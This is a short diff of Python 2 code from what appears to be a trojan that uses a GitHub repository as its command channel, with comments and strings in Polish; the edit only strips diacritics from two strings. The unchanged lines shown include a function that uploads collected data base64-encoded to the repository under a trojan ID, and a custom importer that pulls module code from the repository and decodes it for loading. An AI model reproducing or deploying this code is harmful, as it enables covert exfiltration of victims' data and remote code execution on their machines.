@@ -45,7 +45,7 @@ return config
 def store_module_result(data):
 gh,repo,branch = connect_to_github()
 remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
-repo.create_file(remote_path,"Wiadomość o zatwierdzeniu",base64.
+repo.create_file(remote_path,"Wiadomosc o zatwierdzeniu",base64.
 b64encode(data))
 return
 class GitImporter(object):
@@ -53,7 +53,7 @@ def __init__(self):
 self.current_module_code = ""
 def find_module(self,fullname,path=None):
 if configured:
-print "[*] Próba pobrania %s" % fullname
+print "[*] Proba pobrania %s" % fullname
 new_library = get_file_contents("modules/%s" % fullname)
 if new_library is not None:
 self.current_module_code = base64.b64decode(new_library)
